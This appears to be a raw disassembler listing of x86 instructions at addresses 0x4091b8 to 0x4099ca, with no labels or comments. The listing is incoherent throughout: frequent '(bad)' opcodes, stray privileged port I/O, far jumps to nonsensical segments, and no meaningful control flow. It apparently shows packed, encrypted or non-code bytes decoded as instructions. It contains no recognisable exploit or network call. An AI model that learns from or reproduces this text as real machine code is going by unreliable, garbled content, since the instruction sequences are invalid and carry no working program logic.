  4091b8:	outs   dx,BYTE PTR ds:[esi]
  4091b9:	add    eax,0xf363b39f
  4091be:	scas   al,BYTE PTR es:[edi]
  4091bf:	fs jmp 0x4091b1
  4091c2:	sub    DWORD PTR [eax+0x7b],0xcb3b5902
  4091c9:	leave  
  4091ca:	sbb    edx,DWORD PTR [ebp+0x2e8c2f73]
  4091d0:	lock xchg ebx,eax
  4091d2:	iret   
  4091d3:	ret    
  4091d4:	xor    dh,BYTE PTR [edi+0x64]
  4091d7:	or     al,0xf6
  4091d9:	xchg   esp,eax
  4091da:	dec    ebp
  4091db:	jmp    0x75bb:0x7ff30292
  4091e2:	aas    
  4091e3:	ret    
  4091e4:	imul   ecx,DWORD PTR [ebx-0x36],0xffffff92
  4091e8:	es rol ebx,cl
  4091eb:	ret    0x2ef
  4091ee:	push   edi
  4091ef:	pushf  
  4091f0:	mov    ebx,0xb0dc3245
  4091f5:	jecxz  0x4091e7
  4091f7:	mov    edi,0xd5bfc4ce
  4091fc:	mov    eax,0x94c92632
  409202:	pop    ebp
  409203:	adc    BYTE PTR [ebx+0x20],bl
  409206:	shr    DWORD PTR [ebx],cl
  409208:	lahf   
  409209:	loope  0x40921c
  40920b:	loopne 0x4091b5
  40920d:	xor    dl,BYTE PTR [esi-0x212be278]
  409213:	loop   0x40925d
  409215:	xor    ebx,esi
  409217:	sbb    BYTE PTR [esi+0x6ee94211],0xfe
  40921e:	xor    ebp,DWORD PTR [ebp-0x2a]
  409221:	xchg   esp,eax
  409222:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409223:	inc    ecx
  409224:	stos   BYTE PTR es:[edi],al
  409225:	sti    
  409226:	fld    st(4)
  409228:	mov    edx,0x32213103
  40922d:	(bad)  
  40922e:	pop    ebx
  40922f:	lahf   
  409230:	inc    edx
  409231:	xchg   esp,eax
  409232:	or     eax,0xe0b383a2
  409237:	mov    edi,0xfabc10e
  40923c:	out    dx,eax
  40923d:	es mov dl,0xbf
  409240:	mov    ds:0x32adb249,eax
  409245:	ficom  DWORD PTR [eax-0x1a]
  409248:	pushf  
  409249:	int    0x32
  40924b:	dec    esp
  40924c:	add    dl,BYTE PTR [edi-0xa]
  40924f:	daa    
  409250:	push   ebx
  409251:	and    eax,0x332600b
  409256:	loopne 0x40920a
  409258:	mov    dl,0x74
  40925a:	sti    
  40925b:	push   0x56956932
  409260:	not    BYTE PTR [ebx+esi*8+0x36331363]
  409267:	mov    ah,0x9d
  409269:	or     edx,DWORD PTR [edx+0x11]
  40926c:	test   eax,0xe35ee66b
  409271:	inc    ecx
  409272:	xor    cl,BYTE PTR [esi+0x47]
  409275:	sbb    DWORD PTR [edx+0x66],esp
  409278:	jmp    0x409210
  40927a:	mov    dl,0x8d
  40927c:	pop    es
  40927d:	in     al,0x48
  40927f:	xor    eax,0x5d7394ae
  409284:	xor    DWORD PTR [ebx],ebp
  409286:	or     DWORD PTR [edi-0x3afc5c5f],edi
  40928c:	xor    bl,BYTE PTR [edx-0x54]
  40928f:	cs enter 0x32a9,0xd1
  409294:	pop    es
  409295:	aaa    
  409296:	mov    bl,BYTE PTR [edx]
  409298:	imul   ebx,DWORD PTR [ecx-0x55ccc3f9],0xffffffa4
  40929f:	mov    edi,0x60c274dc
  4092a4:	xor    ah,BYTE PTR [ebx+0x13e35ad0]
  4092aa:	and    eax,DWORD PTR [ecx]
  4092ac:	inc    ebp
  4092ad:	sti    
  4092ae:	shr    DWORD PTR [ebp-0x62003e25],cl
  4092b4:	out    dx,eax
  4092b5:	inc    edx
  4092b6:	push   cs
  4092b7:	mov    edi,0x45eb2c29
  4092bc:	mov    dh,0x2
  4092be:	pop    esp
  4092bf:	add    al,0xc8
  4092c1:	and    eax,0x1b4ab432
  4092c6:	mov    dl,0x37
  4092c8:	jmp    0x409304
  4092ca:	jb     0x409261
  4092cc:	xor    BYTE PTR [ebx-0x20],dh
  4092cf:	lahf   
  4092d0:	stos   BYTE PTR es:[edi],al
  4092d1:	loope  0x40927e
  4092d3:	shl    BYTE PTR [edi+0x5f],1
  4092d6:	add    eax,0xd20cc2bf
  4092db:	push   0xc6d323c2
  4092e0:	imul   edx,DWORD PTR [ebx+eax*1],0xffffffd7
  4092e4:	repz dec ecx
  4092e6:	mov    ?,WORD PTR [edi+0x9cb2dee]
  4092ec:	cmp    ecx,DWORD PTR [edi-0x2b7f106]
  4092f2:	mov    DWORD PTR [edx+0x1b],0xca861a0d
  4092f9:	sbb    eax,0x29b944b
  4092fe:	cmp    ah,dl
  409300:	jb     0x40932b
  409302:	xor    cl,BYTE PTR [ebp+0x3c6222eb]
  409308:	jle    0x4092d2
  40930a:	sub    esp,DWORD PTR [ebp+0x32]
  40930d:	or     eax,ebx
  40930f:	mov    ebp,DWORD PTR [ebx+0x336321f6]
  409315:	push   ds
  409316:	mov    WORD PTR [ecx-0x1aaa7029],cs
  40931c:	mov    ah,0x3d
  40931e:	mov    WORD PTR [eax],ds
  409320:	xchg   edi,eax
  409321:	(bad)  
  409322:	push   ebx
  409323:	std    
  409324:	mov    eax,0xeb08b733
  409329:	mov    ebp,0x63ad854b
  40932e:	clc    
  40932f:	adc    esi,0x1bdf21f2
  409335:	je     0x4092e4
  409337:	pop    ebp
  409338:	shr    ecx,0x46
  40933b:	dec    edx
  40933c:	inc    eax
  40933d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40933e:	scas   eax,DWORD PTR es:[edi]
  40933f:	mov    al,0x89
  409341:	out    0x4b,eax
  409343:	test   DWORD PTR [ebx-0xe],esi
  409346:	xor    BYTE PTR [ecx],cl
  409348:	(bad)  
  409349:	jmp    0x409370
  40934b:	or     BYTE PTR [esi+0x5e],0xb0
  40934f:	mov    dl,0x9f
  409351:	add    DWORD PTR [edi-0x53],eax
  409354:	shl    DWORD PTR [ebx-0x25570115],1
  40935a:	and    BYTE PTR [esi-0x307398ba],dh
  409360:	xchg   edi,eax
  409361:	sub    eax,0x2e519e65
  409366:	mov    ecx,edx
  409368:	inc    esp
  409369:	jmp    0x409387
  40936b:	cwde   
  40936c:	or     ch,BYTE PTR [edx-0x26]
  40936f:	mov    esi,0x836699a9
  409374:	push   edi
  409375:	aas    
  409376:	test   BYTE PTR [edx-0x5a947625],0xe4
  40937d:	jmp    0x40936c
  40937f:	lahf   
  409380:	aam    0x60
  409382:	loopne 0x4093fa
  409384:	sub    eax,DWORD PTR [edx-0xe]
  409387:	mov    ds:0x8550ad95,al
  40938c:	sub    ebp,DWORD PTR [ebx-0x7f]
  40938f:	jbe    0x40940f
  409391:	push   cs
  409392:	push   cs
  409393:	mov    ebp,0x84a519ec
  409398:	xchg   edx,eax
  409399:	sbb    eax,0x406d7078
  40939e:	push   es
  40939f:	mov    ss,WORD PTR [esi+0x4688428f]
  4093a5:	popa   
  4093a6:	outs   dx,BYTE PTR ds:[esi]
  4093a7:	dec    ebx
  4093a8:	mov    DWORD PTR [esi+esi*1-0x300b890e],ebx
  4093af:	mov    bh,dl
  4093b1:	les    eax,FWORD PTR [esi+edx*4-0x68]
  4093b5:	or     edi,DWORD PTR [edx-0x33]
  4093b8:	pop    es
  4093b9:	loope  0x40940e
  4093bb:	xchg   BYTE PTR [edx+0x1d],al
  4093be:	mov    bh,0x34
  4093c0:	fdiv   QWORD PTR [ebx+esi*1+0x990ddb4]
  4093c7:	retf   0xf593
  4093ca:	or     ecx,DWORD PTR [edi-0xb5b818f]
  4093d0:	jle    0x40936b
  4093d2:	inc    edi
  4093d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093d4:	sbb    al,0x6a
  4093d6:	mov    dl,0xfe
  4093d8:	mov    esi,0xf7844bc4
  4093dd:	mov    bh,al
  4093df:	mov    DWORD PTR [eax-0xdb2c11c],0x5b82937d
  4093e9:	add    DWORD PTR [ebx-0x4f35c1e1],0x5424890a
  4093f3:	mov    ebx,0xc626116e
  4093f8:	(bad)  
  4093f9:	jg     0x409443
  4093fb:	mov    WORD PTR [esi-0x50],es
  4093fe:	mov    gs,WORD PTR [ecx-0x7b]
  409401:	xor    DWORD PTR [edx],ebx
  409403:	ins    BYTE PTR es:[edi],dx
  409404:	idiv   DWORD PTR [edi+0x7]
  409407:	out    dx,al
  409408:	stos   DWORD PTR es:[edi],eax
  409409:	aad    0x83
  40940b:	sbb    BYTE PTR [ebx+0x6a],bl
  40940e:	xchg   ecx,eax
  40940f:	and    eax,0x1f
  409412:	and    eax,esi
  409414:	jb     0x409461
  409416:	out    dx,eax
  409417:	call   0x1d4aa56e
  40941c:	ins    BYTE PTR es:[edi],dx
  40941d:	inc    edx
  40941e:	mov    dl,0xb8
  409420:	mov    ebx,0x6a8906c9
  409425:	jnp    0x40947e
  409427:	mov    ds:0x9807f6ca,al
  40942c:	sbb    al,0x60
  40942e:	repnz inc esi
  409430:	mov    edi,0xe976a8d
  409435:	jge    0x4093c6
  409437:	dec    edi
  409438:	es xor dh,bl
  40943b:	addr16 jo 0x40943b
  40943e:	xchg   edx,eax
  40943f:	int    0xa6
  409441:	enter  0xa8c3,0xb2
  409445:	xlat   BYTE PTR ds:[ebx]
  409446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409447:	(bad)  
  409448:	hlt    
  409449:	adc    eax,0x5165a3e3
  40944e:	loop   0x4093ee
  409450:	sbb    BYTE PTR [esi+0x192adf46],dh
  409456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409457:	mov    esi,0x88508dfe
  40945c:	mov    ds:0xfec3a747,al
  409461:	adc    edi,0xffffff96
  409464:	dec    edx
  409465:	pop    es
  409466:	das    
  409467:	cli    
  409468:	mov    ds:0x55b3829b,al
  40946d:	jb     0x40941d
  40946f:	(bad)  [ebx+0x7d]
  409472:	inc    esp
  409473:	mov    edx,0x55046a2f
  409478:	xchg   ebp,eax
  409479:	fisubr DWORD PTR [edi-0x40]
  40947c:	inc    edx
  40947d:	popa   
  40947e:	push   0xffffffcc
  409480:	cdq    
  409481:	bound  ebx,QWORD PTR [edi+edx*4]
  409484:	dec    esi
  409485:	cmp    esi,DWORD PTR [edi+esi*4-0x6abd63c1]
  40948c:	ret    0x694a
  40948f:	cmp    al,0x5a
  409491:	xchg   ecx,eax
  409492:	and    dh,BYTE PTR [bp+si-0x61]
  409496:	jp     0x409430
  409498:	ror    dl,cl
  40949a:	stc    
  40949b:	adc    BYTE PTR [ebx],al
  40949d:	repnz mov dl,0x3c
  4094a0:	(bad)  
  4094a1:	and    al,0x2d
  4094a3:	mov    ebx,0xa7627ff2
  4094a8:	sbb    eax,0xe5906eb5
  4094ad:	push   edx
  4094ae:	mov    dl,0xdc
  4094b0:	and    edx,DWORD PTR [ebx+ebp*1+0x7e2912b7]
  4094b7:	xchg   BYTE PTR [edx+0x7351dad6],bh
  4094bd:	in     eax,0x72
  4094bf:	add    BYTE PTR [edx+0x668113d1],dh
  4094c5:	inc    esp
  4094c6:	and    edi,ebp
  4094c8:	and    eax,0x42c09650
  4094cd:	add    esi,DWORD PTR [ebp-0x754230b1]
  4094d3:	mov    ebx,0x949e7a7d
  4094d8:	pop    esi
  4094d9:	call   0x1d4cf873
  4094de:	ror    al,0xcf
  4094e1:	mov    DWORD PTR [ecx+eax*4+0x49da494d],esp
  4094e8:	nop
  4094e9:	pop    ebx
  4094ea:	mov    esp,0xf6c36b90
  4094ef:	jmp    0x8f9ba6a8
  4094f4:	fisub  DWORD PTR [edi-0x7661ab51]
  4094fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094fb:	call   0x870f3439
  409500:	nop
  409501:	in     al,0xff
  409503:	les    edx,FWORD PTR [eax+0x70]
  409506:	ss mov esi,0xd7bd9596
  40950c:	sbb    eax,0xafc0fa2d
  409511:	cmp    ecx,ebx
  409513:	sub    al,0x2e
  409515:	cmp    al,0x38
  409517:	xlat   BYTE PTR ds:[ebx]
  409518:	(bad)  
  409519:	int3   
  40951a:	xchg   ecx,eax
  40951b:	fld    DWORD PTR [ecx-0x1c]
  40951e:	imul   ebx,ebx,0x17619cd2
  409524:	outs   dx,DWORD PTR ds:[esi]
  409525:	xor    esp,edx
  409527:	mov    edx,0x77c4f08b
  40952c:	ins    BYTE PTR es:[edi],dx
  40952d:	pop    eax
  40952e:	loop   0x4094b0
  409530:	inc    edx
  409531:	cli    
  409532:	daa    
  409533:	inc    ebx
  409534:	sub    ah,BYTE PTR [ebx+0x2db202e6]
  40953a:	mov    dl,0x55
  40953c:	add    DWORD PTR [ebx+0xc623286],esi
  409542:	mov    bh,0xe3
  409544:	mov    bl,0x37
  409546:	dec    esi
  409547:	out    0x72,al
  409549:	adc    al,0xa7
  40954b:	shl    DWORD PTR [ebx+0x73d6be57],cl
  409551:	icebp  
  409552:	xor    DWORD PTR [ecx-0x7dbd6ff6],eax
  409558:	fisub  DWORD PTR ds:0xcd56c313
  40955e:	enter  0xfcd9,0xef
  409562:	sub    BYTE PTR [ecx+ebx*1+0x16],ah
  409566:	sbb    eax,0x77c8bd6b
  40956b:	mov    esi,0xbad128a3
  409570:	test   al,0xb2
  409572:	ja     0x4095e3
  409574:	push   ds
  409575:	ror    DWORD PTR [eax-0x78b0796d],0xc0
  40957c:	push   eax
  40957d:	(bad)  
  40957e:	fild   QWORD PTR [eax-0x8aa086a]
  409584:	pop    esp
  409585:	sub    DWORD PTR [edx-0x32],edx
  409588:	xchg   ebp,eax
  409589:	in     al,0x71
  40958b:	push   0xf6e35703
  409590:	add    eax,0x51eb7170
  409595:	cmc    
  409596:	nop
  409597:	les    ecx,FWORD PTR [ecx+ecx*4]
  40959a:	sahf   
  40959b:	xlat   BYTE PTR ds:[ebx]
  40959c:	inc    ecx
  40959d:	pop    edx
  40959e:	mov    ebx,0x9fa99305
  4095a3:	mov    ecx,0x87b746ee
  4095a8:	stc    
  4095a9:	mov    esi,0x8316570e
  4095ae:	arpl   ax,ax
  4095b0:	xchg   esi,eax
  4095b1:	mov    ds:0x373b85dd,eax
  4095b6:	(bad)  
  4095b7:	sub    ecx,DWORD PTR [ebx-0x6f]
  4095ba:	jbe    0x409565
  4095bc:	pusha  
  4095bd:	add    DWORD PTR [edx-0x15],eax
  4095c0:	xor    ch,0x4a
  4095c3:	adc    ebx,0x60
  4095c6:	data16 int3 
  4095c8:	imul   ecx,DWORD PTR [edi-0x12],0xffffffd1
  4095cc:	add    bh,dh
  4095ce:	stos   DWORD PTR es:[edi],eax
  4095cf:	adc    BYTE PTR [esi-0x3a],cl
  4095d2:	mov    al,ds:0xf75d6ed4
  4095d7:	jle    0x40961b
  4095d9:	imul   esp,DWORD PTR [ecx-0x59],0xffffff95
  4095dd:	xchg   esi,eax
  4095de:	arpl   WORD PTR [edx-0xfcc0963],bp
  4095e4:	addr16 push esi
  4095e6:	test   bh,ch
  4095e8:	scas   eax,DWORD PTR es:[edi]
  4095e9:	leave  
  4095ea:	add    ebp,ebx
  4095ec:	push   0xffffffe0
  4095ee:	mov    al,BYTE PTR [eax-0x5d994c58]
  4095f4:	cmp    al,0xb
  4095f6:	pusha  
  4095f7:	xor    dl,BYTE PTR [esi+0x12a0e9b1]
  4095fd:	sbb    esp,DWORD PTR [esi+0x31b6889c]
  409603:	mov    cl,0x3a
  409605:	cmp    esi,ebx
  409607:	ffreep st(7)
  409609:	arpl   WORD PTR [edx],cx
  40960b:	xlat   BYTE PTR ds:[ebx]
  40960c:	pop    eax
  40960d:	outs   dx,BYTE PTR ds:[esi]
  40960e:	and    bl,BYTE PTR [edi]
  409610:	push   esi
  409611:	out    0x42,eax
  409613:	les    esi,FWORD PTR [edx]
  409615:	xor    BYTE PTR [edi],ah
  409617:	mov    ah,BYTE PTR [ebp+0x40d7efdd]
  40961d:	xchg   edi,eax
  40961e:	dec    esp
  40961f:	mov    edx,0xfc949279
  409624:	lds    esi,FWORD PTR [ebx]
  409626:	dec    edx
  409627:	neg    BYTE PTR [ebp-0x73]
  40962a:	retf   
  40962b:	lock cmp BYTE PTR [ebp+0x3e],bl
  40962f:	and    dh,BYTE PTR [eax]
  409631:	in     eax,dx
  409632:	arpl   cx,di
  409634:	dec    ecx
  409635:	(bad)  
  409636:	pop    edi
  409637:	popa   
  409638:	ret    
  409639:	mov    eax,0x262fd314
  40963e:	stc    
  40963f:	cli    
  409640:	jp     0x4095f7
  409642:	jnp    0x409635
  409644:	xor    eax,0x62e6a67e
  409649:	loopne 0x4095e4
  40964b:	mov    dl,0x29
  40964d:	data16 mov dl,0xca
  409650:	adc    al,0x1e
  409652:	or     eax,0xb40c7695
  409657:	sahf   
  409658:	xor    ah,dl
  40965a:	fist   DWORD PTR [ebx-0x22296846]
  409660:	jle    0x409621
  409662:	dec    eax
  409663:	mov    bl,0x5f
  409665:	loop   0x4096d1
  409667:	mov    dh,0xef
  409669:	xlat   BYTE PTR ds:[ebx]
  40966a:	dec    edi
  40966b:	popa   
  40966c:	sub    al,0x63
  40966e:	lods   eax,DWORD PTR ds:[esi]
  40966f:	fnop   
  409671:	imul   DWORD PTR [esi]
  409673:	xchg   ebp,eax
  409674:	fs mov dl,0x98
  409677:	push   eax
  409678:	stos   BYTE PTR es:[edi],al
  409679:	repz inc esi
  40967b:	nop
  40967c:	xor    cl,BYTE PTR [edi-0x53]
  40967f:	cmp    bl,bh
  409681:	xor    bh,al
  409683:	stos   BYTE PTR es:[edi],al
  409684:	ds pop ecx
  409686:	cmp    dh,bl
  409688:	ins    BYTE PTR es:[edi],dx
  409689:	sbb    DWORD PTR [ebx],esp
  40968b:	sub    al,0x7e
  40968d:	mov    al,ds:0x6e1dab93
  409692:	inc    esp
  409693:	dec    ecx
  409694:	jae    0xf6d049be
  40969a:	or     eax,0x5354a803
  40969f:	mov    ds:0x86f2e7a9,al
  4096a4:	(bad)  
  4096a5:	sar    DWORD PTR [eax-0x42],1
  4096a8:	cdq    
  4096a9:	add    bl,ah
  4096ab:	pop    ebp
  4096ac:	cmc    
  4096ad:	jge    0x40971a
  4096af:	mov    esi,0xe2c1a4b9
  4096b4:	adc    DWORD PTR [ecx+0xd],0xffffffe7
  4096b8:	cmc    
  4096b9:	jns    0x409670
  4096bb:	inc    DWORD PTR [edi-0x6519f284]
  4096c1:	int3   
  4096c2:	ja     0x409680
  4096c4:	bound  eax,QWORD PTR [ebx+0x6b]
  4096c7:	mov    dl,0xbe
  4096c9:	hlt    
  4096ca:	adc    DWORD PTR [ebx],esp
  4096cc:	push   0xffffff87
  4096ce:	mov    ecx,esp
  4096d0:	xchg   ebp,eax
  4096d1:	in     eax,dx
  4096d2:	pop    edi
  4096d3:	mov    cl,0x68
  4096d5:	fwait
  4096d6:	pop    es
  4096d7:	mov    esi,0x5f6b8254
  4096dc:	pop    DWORD PTR [edi+0x78e6d4d6]
  4096e2:	cmp    ch,cl
  4096e4:	inc    ebx
  4096e5:	adc    esi,DWORD PTR [edx+ecx*1-0x61885241]
  4096ec:	scas   eax,DWORD PTR es:[edi]
  4096ed:	int    0x23
  4096ef:	pop    edx
  4096f0:	retf   
  4096f1:	add    bl,BYTE PTR [esi+0x13]
  4096f4:	adc    BYTE PTR [ecx],ah
  4096f6:	pop    ecx
  4096f7:	or     BYTE PTR [edi+eax*4+0x1738b3a7],bh
  4096fe:	(bad)  
  4096ff:	shl    BYTE PTR [edx-0x1ebd413e],0xbb
  409706:	push   cs
  409707:	mov    ah,BYTE PTR [ebx]
  409709:	sar    esi,0xa6
  40970c:	jle    0x40972d
  40970e:	loop   0x4096a2
  409710:	xchg   edi,eax
  409711:	in     al,0x53
  409713:	dec    DWORD PTR [edx+0x71]
  409716:	scas   al,BYTE PTR es:[edi]
  409717:	(bad)  
  409719:	xchg   ecx,eax
  40971a:	jno    0x4096df
  40971c:	icebp  
  40971d:	cmp    eax,DWORD PTR [edx+0x3a]
  409720:	(bad)  
  409721:	sub    cl,BYTE PTR [edi]
  409723:	sub    BYTE PTR [eax],bh
  409725:	jo     0x40971b
  409727:	in     al,dx
  409728:	out    0x14,al
  40972a:	imul   edi,DWORD PTR [ebp+0x4a],0x2b
  40972e:	ret    
  40972f:	fbstp  TBYTE PTR [ebp+0x2f5849e7]
  409735:	xlat   BYTE PTR ds:[ebx]
  409736:	jne    0x409737
  409738:	int3   
  409739:	jmp    0x22a83374
  40973e:	inc    edx
  40973f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409740:	loop   0x409709
  409742:	xor    ebx,DWORD PTR [ecx-0x5692e069]
  409748:	cwde   
  409749:	(bad)  
  40974a:	daa    
  40974b:	mov    eax,ds:0xefe76b8b
  409750:	jmp    0xa464:0x6820dff
  409757:	mov    ebp,0x804f377a
  40975c:	outs   dx,BYTE PTR ds:[esi]
  40975d:	sub    eax,0xe744cf73
  409762:	dec    esp
  409763:	xor    al,0x48
  409765:	sub    ch,ch
  409767:	in     eax,0x8f
  409769:	icebp  
  40976a:	mov    al,cl
  40976c:	daa    
  40976d:	ss and cl,0xae
  409771:	inc    edx
  409772:	lahf   
  409773:	fwait
  409774:	sub    ebx,DWORD PTR [esp+ecx*4+0x3b6d85eb]
  40977b:	mov    dh,BYTE PTR [ebx+0x6f]
  40977e:	xchg   ecx,eax
  40977f:	aas    
  409780:	loop   0x4097b3
  409782:	add    ebp,eax
  409784:	xchg   edi,eax
  409785:	jp     0x409732
  409787:	leave  
  409788:	lock in al,dx
  40978a:	add    al,0xbf
  40978c:	mov    edi,0x2c35d39d
  409791:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409792:	add    edi,DWORD PTR [eax-0x791e3094]
  409798:	xchg   ebx,eax
  409799:	sar    BYTE PTR [ecx+0x52853bd2],0x1f
  4097a0:	aaa    
  4097a1:	ja     0x409753
  4097a3:	popf   
  4097a4:	sahf   
  4097a5:	ja     0x409765
  4097a7:	mov    al,ds:0x812deaf3
  4097ac:	sub    eax,0x49c0cb76
  4097b1:	and    eax,0x155a95a1
  4097b6:	fscale 
  4097b8:	fbstp  TBYTE PTR [esi+0x6702992b]
  4097be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097bf:	mov    edi,DWORD PTR [esi+0x73bf62f2]
  4097c5:	sbb    eax,0x66eec72a
  4097ca:	inc    ebp
  4097cb:	stc    
  4097cc:	dec    edi
  4097cd:	cs mov cs,ecx
  4097d0:	sub    BYTE PTR [ebp-0x3e],al
  4097d3:	cmc    
  4097d4:	push   0xe9abf39e
  4097d9:	push   ebp
  4097da:	xor    dh,BYTE PTR [eax-0x65]
  4097dd:	stc    
  4097de:	push   ebx
  4097df:	cli    
  4097e0:	mov    al,ds:0x65a5c331
  4097e5:	and    bh,BYTE PTR [edi]
  4097e7:	sub    bl,bl
  4097e9:	cs sahf 
  4097eb:	jno    0x4097e2
  4097ed:	mov    esp,0x58f07f1d
  4097f2:	pop    ds
  4097f3:	std    
  4097f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097f5:	out    dx,al
  4097f6:	inc    esp
  4097f7:	rcr    edx,1
  4097f9:	pop    es
  4097fa:	jno    0x40979f
  4097fc:	add    edx,DWORD PTR [esi]
  4097fe:	xchg   ebx,eax
  4097ff:	sub    eax,0xe11b40a2
  409804:	idiv   BYTE PTR [esi+0x17532ee2]
  40980a:	das    
  40980b:	push   ss
  40980c:	ficomp WORD PTR [eax-0x36]
  40980f:	jg     0x4097fc
  409811:	movzx  esi,BYTE PTR [ebx-0x66]
  409815:	inc    edx
  409816:	xor    DWORD PTR [esp+ecx*2],eax
  409819:	xchg   ebp,eax
  40981a:	jo     0x409817
  40981c:	mov    edi,0x9c87a32b
  409821:	aaa    
  409822:	xchg   ecx,eax
  409823:	in     eax,0x4c
  409825:	ss mov dh,0xe7
  409828:	out    dx,al
  409829:	cld    
  40982a:	ret    0x747b
  40982d:	mov    al,ds:0x799b2f7
  409832:	dec    ebx
  409833:	push   0xbb575eef
  409838:	mov    ebx,0x335451af
  40983d:	jnp    0x40985f
  40983f:	loop   0x40981b
  409841:	lock test DWORD PTR ds:0x8ebf6744,esp
  409848:	inc    esi
  40984a:	jl     0x4097f1
  40984c:	adc    DWORD PTR [esi],ebx
  40984e:	mov    al,0x3b
  409850:	retf   0xded
  409853:	add    edx,DWORD PTR [edx]
  409855:	xchg   edi,eax
  409856:	scas   eax,DWORD PTR es:[edi]
  409857:	outs   dx,DWORD PTR ds:[esi]
  409858:	fwait
  409859:	leave  
  40985a:	xor    eax,0x8a2ba892
  40985f:	ret    0xecd3
  409862:	or     edx,DWORD PTR [eax+0x7]
  409865:	loope  0x4098ba
  409867:	clc    
  409868:	xchg   ebp,eax
  409869:	enter  0x2a2d,0x46
  40986d:	dec    esi
  40986e:	fcmovb st,st(0)
  409870:	lds    ebp,FWORD PTR [ecx+0x72156371]
  409876:	mov    ds:0x7e1acb2,eax
  40987b:	inc    ebp
  40987c:	pop    edx
  40987d:	mov    ebx,0x5cb4afca
  409882:	xchg   edx,eax
  409883:	aad    0x57
  409885:	pop    esi
  409886:	pushf  
  409887:	mov    ah,0x8e
  409889:	or     BYTE PTR [eax+0x68],ch
  40988c:	pop    ds
  40988d:	rol    DWORD PTR [ecx+0x48959c78],0x71
  409894:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409895:	inc    ecx
  409896:	stos   BYTE PTR es:[edi],al
  409897:	xchg   BYTE PTR [esi+0x4da462f5],ah
  40989d:	pop    ebp
  40989e:	loop   0x4098e2
  4098a0:	lods   al,BYTE PTR ds:[esi]
  4098a1:	dec    ecx
  4098a2:	add    DWORD PTR cs:[esi+0x60],0x69
  4098a7:	adc    al,0xd1
  4098aa:	push   ebp
  4098ab:	fucomip st,st(1)
  4098ad:	sub    esp,ebx
  4098af:	mov    BYTE PTR [ebx+0x65d56cf3],ah
  4098b5:	add    eax,0xe1b69480
  4098ba:	test   eax,0x70b27b94
  4098bf:	mov    ebx,0xb0ef198a
  4098c4:	push   ds
  4098c5:	push   esp
  4098c6:	push   ebx
  4098c7:	ss pop ebx
  4098c9:	xor    eax,0x303f9836
  4098ce:	mov    al,0x4b
  4098d0:	test   eax,0x7fe1b1b1
  4098d5:	mov    eax,ds:0xede60bb8
  4098da:	jmp    0x409881
  4098dc:	dec    edi
  4098dd:	push   esi
  4098de:	out    dx,eax
  4098df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098e0:	scas   al,BYTE PTR es:[edi]
  4098e1:	push   ss
  4098e2:	sbb    ebp,DWORD PTR [ebx+0x16453337]
  4098e8:	aas    
  4098e9:	enter  0x9b77,0x6d
  4098ed:	call   0xb86a:0xf57638b1
  4098f4:	dec    ebp
  4098f5:	(bad)  
  4098f7:	lock push ds
  4098f9:	stos   DWORD PTR es:[edi],eax
  4098fa:	paddq  mm5,QWORD PTR [esi+0x2]
  4098fe:	adc    cl,bl
  409900:	fst    QWORD PTR [ebx+0x53]
  409903:	push   esi
  409904:	or     edi,ebx
  409906:	pop    esp
  409907:	fimul  DWORD PTR [eax+0x49]
  40990a:	xchg   edi,eax
  40990b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40990c:	and    al,0x70
  40990e:	or     edx,0xffffffe3
  409911:	inc    edi
  409912:	mov    ah,0xd6
  409914:	lods   al,BYTE PTR ds:[esi]
  409915:	pop    edi
  409916:	add    eax,0x3c1244cf
  40991b:	sbb    al,0x58
  40991d:	ins    BYTE PTR es:[edi],dx
  40991e:	out    0xd7,al
  409920:	mov    ebx,0x80854771
  409925:	adc    eax,0x8a92fadb
  40992a:	inc    edi
  40992b:	mov    ebx,0x8e924833
  409930:	ret    
  409931:	les    edx,FWORD PTR [esi]
  409933:	jge    0x409940
  409935:	inc    edx
  409936:	mov    bh,0xb2
  409938:	sub    DWORD PTR [edx+0x23fb9f6a],0xffffff99
  40993f:	ret    
  409940:	fisubr WORD PTR [eax+0x46]
  409943:	jmp    0x4098f9
  409945:	xchg   ebx,eax
  409946:	aaa    
  409947:	ret    0xaeea
  40994a:	sbb    al,0x63
  40994c:	stos   BYTE PTR es:[edi],al
  40994d:	and    eax,0x82226776
  409952:	inc    esp
  409953:	mov    ch,0x4f
  409955:	or     esi,ecx
  409957:	add    BYTE PTR [ebp-0x3f46cac9],dh
  40995d:	xchg   ecx,eax
  40995e:	sbb    eax,0xd5aa5ac4
  409963:	test   eax,0x8cc60ac0
  409968:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40996a:	mov    ds:0xc93c6c45,al
  40996f:	inc    edx
  409970:	scas   al,BYTE PTR es:[edi]
  409971:	lods   eax,DWORD PTR ds:[esi]
  409972:	mov    ch,0x7e
  409974:	xor    DWORD PTR [ecx-0x78],eax
  409977:	call   0x1095f922
  40997c:	pop    edi
  40997d:	sub    DWORD PTR [eax-0x31],ecx
  409980:	mul    ch
  409982:	gs mov al,0x6a
  409985:	pop    edi
  409986:	and    ecx,DWORD PTR [ebp+0x45ba3194]
  40998c:	xchg   ecx,eax
  40998d:	inc    edi
  40998e:	fcmove st,st(5)
  409990:	popa   
  409991:	test   eax,0xa79fd0e5
  409996:	out    0x50,al
  409998:	popf   
  409999:	cld    
  40999a:	and    eax,0xe1ee32bf
  40999f:	jmp    0x11a3:0x7c4acd9e
  4099a6:	popa   
  4099a7:	iret   
  4099a8:	fs popf 
  4099aa:	outs   dx,BYTE PTR ds:[esi]
  4099ab:	xchg   DWORD PTR [ebp-0x4bdcaf3a],ecx
  4099b1:	adc    BYTE PTR [ebp+0x26041c1],dh
  4099b7:	sti    
  4099b8:	ret    0x48a0
  4099bb:	test   DWORD PTR [eax-0x11509c07],ebx
  4099c1:	mov    BYTE PTR [ebx+0x3],0x19
  4099c5:	cli    
  4099c6:	loopne 0x409953
  4099c8:	pop    ebp
  4099c9:	clc    
  4099ca:	popa   
